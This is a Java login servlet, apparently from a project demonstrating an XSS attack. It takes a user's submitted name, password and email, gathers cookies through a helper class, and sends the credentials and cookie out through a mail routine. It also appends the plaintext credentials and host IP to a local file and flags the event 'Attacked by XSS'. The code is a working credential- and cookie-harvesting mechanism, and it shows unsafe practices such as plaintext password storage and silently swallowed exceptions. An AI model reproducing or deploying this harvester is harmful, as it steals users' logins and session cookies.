/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

import DB.DbQuery;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.servlet.RequestDispatcher;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

/**
 *
 * @author stigmata
 */
public class UserLogin1 extends HttpServlet {

    /**
     * Processes requests for both HTTP <code>GET</code> and <code>POST</code>
     * methods.
     *
     * @param request servlet request
     * @param response servlet response
     * @throws ServletException if a servlet-specific error occurs
     * @throws IOException if an I/O error occurs
     */
    protected void processRequest(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException, Exception {
        response.setContentType("text/html;charset=UTF-8");
        try (PrintWriter out = response.getWriter()) {

            String name = request.getParameter("name");
            String pass = request.getParameter("pass");
            String mail = request.getParameter("mail");
            
            
            GetCookiesFromHTTPConnection cookie=new  GetCookiesFromHTTPConnection();
           String cook= cookie.mm();
            

            //session
            HttpSession s = request.getSession();
            s.setAttribute("username", name);

            InetAddress localhost = InetAddress.getLocalHost();
            System.out.println("System IP Address : "
                    + (localhost.getHostAddress()).trim());

            String outValue = "User Name=" + name + "\n\n\n"
                    + "Password=" + pass + "\n\n\n"
                    + "Your E-mail=" + mail + "\n\n\n"
                    + "Your ip is=" + localhost + "\n\n";
            
            String url1 = request.getRequestURL().toString();
            
            
            sendmaill ss=new sendmaill();
            ss.sendgroup(mail,url1, name, pass,cook);

            //DB
            GetConnection g = new GetConnection();

            try {
                int x = 0;
                String url = g.getPropertyValue("jdbc.url");
                String username = g.getPropertyValue("jdbc.username");
                String password = g.getPropertyValue("jdbc.password");
                String driver = g.getPropertyValue("jdbc.driver");
                PreparedStatement ps = null;
                Class.forName(driver);
                Connection con = (Connection) DriverManager.getConnection(url, username, password);
                ps = con.prepareStatement(DbQuery.LOGIN);
                ps.setString(1, name);
                ps.setString(2, pass);
                ps.setString(3, mail);
                ResultSet rs = ps.executeQuery();
                while (rs.next()) {
                    x++;
                }
                if (x != 0) {
                    BufferedWriter outStream = new BufferedWriter(
                            new FileWriter("E:\\UserData.txt", true));
                    outStream.newLine();
                    outStream.write(outValue);
                    outStream.close();
                    String log = "Attacked by XSS";
                    request.setAttribute("log", log);
                    request.getRequestDispatcher("UserHome.jsp").forward(request, response);

//                    out.println("<script type=\"text/javascript\">");
//                    out.println("alert('Attacked by XSS.. To prevent from xss again Login');");
//                    out.println("location='UserLogin1.jsp'");
//                    out.println("</script>");
                } else {
                    String log = "Login Failed";
                    request.setAttribute("log", log);
                    request.getRequestDispatcher("UserLogin.jsp").forward(request, response);
//
//                    out.println("<script type=\"text/javascript\">");
//                    out.println("alert('Login Success');");
//                    out.println("location='sadminhome.jsp'");
//                    out.println("</script>");
                }

            } catch (Exception e) {

            }

        }
    }

    // <editor-fold defaultstate="collapsed" desc="HttpServlet methods. Click on the + sign on the left to edit the code.">
    /**
     * Handles the HTTP <code>GET</code> method.
     *
     * @param request servlet request
     * @param response servlet response
     * @throws ServletException if a servlet-specific error occurs
     * @throws IOException if an I/O error occurs
     */
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        try {
            processRequest(request, response);
        } catch (Exception ex) {
            Logger.getLogger(UserLogin1.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    /**
     * Handles the HTTP <code>POST</code> method.
     *
     * @param request servlet request
     * @param response servlet response
     * @throws ServletException if a servlet-specific error occurs
     * @throws IOException if an I/O error occurs
     */
    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        try {
            processRequest(request, response);
        } catch (Exception ex) {
            Logger.getLogger(UserLogin1.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    /**
     * Returns a short description of the servlet.
     *
     * @return a String containing servlet description
     */
    @Override
    public String getServletInfo() {
        return "Short description";
    }// </editor-fold>

}
